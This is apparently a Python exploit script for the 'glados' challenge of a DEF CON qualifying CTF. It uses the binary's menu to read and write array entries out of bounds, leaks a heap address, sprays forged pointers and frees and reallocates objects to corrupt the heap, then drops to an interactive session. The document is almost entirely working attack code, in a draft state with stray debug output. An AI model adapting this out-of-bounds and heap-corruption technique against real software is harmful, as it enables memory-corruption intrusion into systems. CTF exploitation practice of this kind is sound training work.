import pwnbox
import struct

debug = False
local = True
if debug and local:
    p = pwnbox.pipe.ProcessPipe('gdb -q glados')
elif local:
    p = pwnbox.pipe.ProcessPipe('./glados_patch')
else:
    p = pwnbox.pipe.SocketPipe('glados_750e1878d025f65d1708549693ce5d5d.quals.shallweplayaga.me',9292)


if debug:
    p.read_until('(gdb)')
    p.write('r\n')
    p.interact()


def lobby():
    p.read_until('Selection: ')

def add_core(d):
    p.write('1\n')
    p.read_until('Selection: ')
    p.write('%d\n' % d)
    lobby()

def interact_core(d):
    p.write('5\n')
    p.read_until('Number:')
    p.write('%d\n' % d)

def remove_core(d):
    p.write('4\n')
    p.read_until('remove?')
    p.read_until('-----------')
    p.write('%d\n'%d)
    lobby()

def RDATA_create_array(n,m):
    interact_core(n)
    p.read_until('allocated?')
    p.write('%d\n' % m)
    lobby()

def DARRAY_create_array(n,m):
    interact_core(n)
    p.read_until('want?')
    p.write('%d\n' % m)
    lobby()


def DARRAY_read(n,m):
    interact_core(n)
    p.read_until('Selection:')
    p.write('2\n')
    p.read_until('Entry: ')
    p.write('%d\n' % m)
    p.read_until('Value: ')
    x = p.read_until('\n')
    lobby()
    return int(x)

def DARRAY_write(n,m,val):
    interact_core(n)
    p.read_until('Selection:')
    p.write('3\n')
    p.read_until('Entry: ')
    p.write('%d\n' % m)
    p.read_until('Value: ')
    p.write('%d\n' % val)
    lobby()

lobby()
add_core(2)

add_core(3)
payload1 = 'A' * 80
DARRAY_create_array(3,(len(payload1) / 8))
d = []
d.append(DARRAY_read(3,-3))
d.append(DARRAY_read(3,-4))

heap_base = d[0] - 0x1190

payload1 = struct.pack('<Q', heap_base+0x150) * 20

temp = struct.unpack('<' + 'Q' * (len(payload1) / 8),payload1)
for i in range(len(payload1) / 8):
    DARRAY_write(3,i,temp[i])
 
remove_core(3)
add_core(7)
add_core(7)
p.interact()

print map(lambda x : hex(x),d)

remove_core(4)
RDATA_create_array(3,24)

print map(lambda x : hex(x),d)
p.interact()
